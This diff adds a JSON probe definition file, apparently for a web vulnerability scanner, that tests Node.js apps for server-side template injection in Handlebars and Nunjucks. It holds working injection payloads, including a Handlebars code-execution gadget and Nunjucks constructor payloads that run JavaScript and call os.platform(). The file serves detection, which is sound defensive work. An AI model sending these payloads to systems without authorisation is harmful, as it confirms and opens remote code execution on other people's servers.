@@ -1,0 +1,132 @@
+{
+  "category": "ssti_js",
+  "description": " \u2014 JavaScript engines (Handlebars, Nunjucks)",
+  "contexts": {
+    "handlebars": {
+      "description": "Server-Side Template Injection probes for Handlebars (Node.js stacks)",
+      "tech_match": [
+        "Node.js",
+        "Express"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{this}}",
+          "description": "Handlebars context dump \u2014 reflects the current context object; non-empty output confirms Handlebars processing",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 20
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+          "description": "Handlebars prototype pollution RCE gadget \u2014 exploits helper lookup chain for code execution; error or unusual output confirms processing",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "TypeError",
+                "Cannot read",
+                "undefined"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "nunjucks": {
+      "description": "Server-Side Template Injection probes for Nunjucks (Node.js stacks)",
+      "tech_match": [
+        "Node.js",
+        "Express"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{range.constructor(\"return 7*7\")()}}",
+          "description": "Nunjucks constructor trick \u2014 range.constructor evaluates JavaScript; 49 confirms code execution in Nunjucks",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "{{range.constructor(\"return global.process.mainModule.require('os').platform()\")()}}",
+          "description": "Nunjucks RCE confirmation \u2014 os.platform() returns 'linux'/'win32'/'darwin' confirming arbitrary code execution",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "linux",
+                "win32",
+                "darwin"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
